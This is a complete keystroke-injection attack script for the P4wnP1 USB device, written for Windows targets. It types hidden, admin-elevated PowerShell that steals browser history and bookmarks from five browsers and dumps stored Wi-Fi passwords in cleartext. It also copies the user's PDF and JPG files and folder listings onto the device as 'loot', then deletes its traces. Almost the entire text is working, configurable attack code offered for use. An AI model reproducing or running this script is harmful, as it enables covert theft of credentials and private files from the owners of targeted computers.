/*##########################################################################################################################################
# Extraction of browsing history/bookmarks/download logs, folder/file structure, targeted files in specified folders and wifi Passwords    #
# Author: chriskalv                                                                                                                        #
#													                                                                                       #
# PREREQUISTES:                                                                                                                            #
# - Enable keyboard and USB mass storage capability on your P4wnP1.                                                                        #
# - Place browser_booty.exe in /tools in order to extract browser data.                                                                    #
# - Edit global settings below to your liking.                                                                                             #
##########################################################################################################################################*/


// GLOBAL SETTINGS
// GENERAL
layout("de");			                                   // Keyboard layout locale
hide=false; 			                                   // Set to true to hide the console window on the target
exit=true;			                                   // Set to true to exit the console once finished
typingSpeed(0,0);		                                   // Typing as fast as possible
var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device
// FILE EXTRACTION              
var user_subfolder1 = ["Documents"]                                // The first folder inside the home user directory that should be inspected
var user_subfolder2 = ["Downloads"]                                // The second folder inside the home user directory that should be inspected
var filetypes_user = ["pdf", "jpg"]                                // The filetypes to extract from the home directory
var add_folder = "ProgramXYZ\\data\\Screenshots"                   // Additional directory inside C:\Program Files (x86)\ that should be looked at for extraction
var filetypes_addfolder = ["jpg"]                                  // The filetypes to extract from the additional directory

// Definition of other variables, arrays, ...
var delay_time = 5                                                 // The time to wait before executing the attack in seconds
var ready = "False"                                                // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                           // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                                // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                       // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                        // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open the attack and make paths
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");                              // Hide the console if chosen to do so
    press("CTRL SHIFT ENTER");                                                                          // Run as admin
    delay(1000);
    press("left");                                                                                      // Get rid of admin prompt
    delay(200);
    press("enter");
    delay(200);
    type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name)\n");	                // Replace 'TEMPUSB' with your drive name
    type("$lootPathFiles = $usbPath + \"loot\\files\";mkdir $lootPathFiles;");                          // Create folder structure and define variables for directories
    type("$lootPathFolders = $usbPath + \"loot\\folder_structure\";mkdir $lootPathFolders;");
    type("$lootPathBrowser = $usbPath + \"loot\\browser_data\";mkdir $lootPathBrowser;");
    type("$lootPathWifi = $usbPath + \"loot\\wifi_data\";mkdir $lootPathWifi;");
    type("$search_dir = Join-Path -Path ${env:ProgramFiles(x86)} -ChildPath '" + add_folder + "';");    // Create variable for additional directory in /Program Files (x86)/
    delay(100);
  
  // Get files/folder structure of Documents, Downloads, Pictures, Videos and Recycle Bin for current user
    type("tree /F /A ([Environment]::GetFolderPath('MyDocuments')) > $lootPathFolders\\$env:COMPUTERNAME-Documents_Dir.txt;tree /F /A ([Environment]::GetFolderPath('MyPictures')) > $lootPathFolders\\$env:COMPUTERNAME-Pictures_Dir.txt;tree /F /A ([Environment]::GetFolderPath('MyVideos')) > $lootPathFolders\\$env:COMPUTERNAME-Videos_Dir.txt;tree /F /A $env:USERPROFILE\\Downloads > $lootPathFolders\\$env:COMPUTERNAME-Downloads_Dir.txt; $shell = New-Object -com shell.application; $rb = $shell.Namespace(10); $items = @(); $items += $rb.items(); Write-Output '----------------Recycle Bin Start----------------', $items.name, Write-Output '----------------Recycle Bin End----------------' > $lootPathFolders\\$env:COMPUTERNAME-Bin_Dir.txt\n");    
    delay(3000)

  // Get browsing history, bookmarks and download names of all browsers
    // Copying Chrome, Brave, Edge, and Opera files to USB, as the orig. files are locked
    type('cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History" -Destination "$usbPath\\C_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History" -Destination "$usbPath\\B_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History" -Destination "$usbPath\\E_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Opera Software\\Opera Stable\\History" -Destination "$usbPath\\O_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\C_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\B_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\E_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Opera Software\\Opera Stable\\Bookmarks" -Destination "$usbPath\\O_Bookmarks"\n');
    // Copying Firefox seperately because it insists on being difficult
    type('cd $env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\; ls | Sort-Object -Property LastWriteTime | Select-Object -Last 1 | cd; cp -Path "places.sqlite" -Destination "$usbPath\\F_History"\n');
    // Execute the .exe in /tools folder
    type('cd $usbPath\\tools; .\\browser_booty.exe > $lootPathBrowser\\$env:COMPUTERNAME-HDB.txt\n');
    //Deletes the database files now that we've extracted all useful information
    type('cd ..; rm * -Include *History; rm * -Include *Bookmarks\n') 
    delay(9000)
  
  // Extract Wifi information/keys
    type("netsh wlan show profiles * > $lootPathWifi\\Known_networks_info.txt;");                       // Get all the known netwoks and info about them and save it
    type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Schlüsselinhalt\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPathWifi\\wifi_keys.txt;")
	// Make sure to change "Schlüsselinhalt" to "Key Content" on English locale
    delay(2000) 
   
  // Copy files of specified filetypes from specified folders (depth: 6 directories)
    type("$home_directory = Get-Variable HOME -valueOnly;");                                            // Get the home directory of the current user  
    for (var i = 0; i < filetypes_user.length; i++) {
        type("mkdir $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n");
        type("copy $home_directory\\" + user_subfolder1 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                              
        type("copy $home_directory\\" + user_subfolder1 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                           
        type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                           
        type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")    
        type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n") 
        type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n") 
    }  
    for (var i = 0; i < filetypes_user.length; i++) {
        type("mkdir $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n");
        type("copy $home_directory\\" + user_subfolder2 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                                 
        type("copy $home_directory\\" + user_subfolder2 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                              
        type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                             
        type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")  
        type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")
        type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")
    }   
    for (var i = 0; i < filetypes_addfolder.length; i++) {
        type("mkdir $lootPathFiles\\non_home_directory\\" + filetypes_addfolder[i] + ";\n");
        type("copy $search_dir\\*." + filetypes_addfolder[i] + " $lootPathFiles\\non_home_directory\\" + filetypes_addfolder[i] + ";\n")                                 
        type("copy $search_dir\\*/*." + filetypes_addfolder[i] + " $lootPathFiles\\non_home_directory\\" + filetypes_addfolder[i] + ";\n")                              
        type("copy $search_dir\\*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\non_home_directory\\" + filetypes_addfolder[i] + ";\n")                             
        type("copy $search_dir\\*/*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\non_home_directory\\" + filetypes_addfolder[i] + ";\n") 
        type("copy $search_dir\\*/*/*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\non_home_directory\\" + filetypes_addfolder[i] + ";\n")
        type("copy $search_dir\\*/*/*/*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\non_home_directory\\" + filetypes_addfolder[i] + ";\n")
    }
	
  //Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}

delay(delay_time * 100);
check_if_ready();
attack();
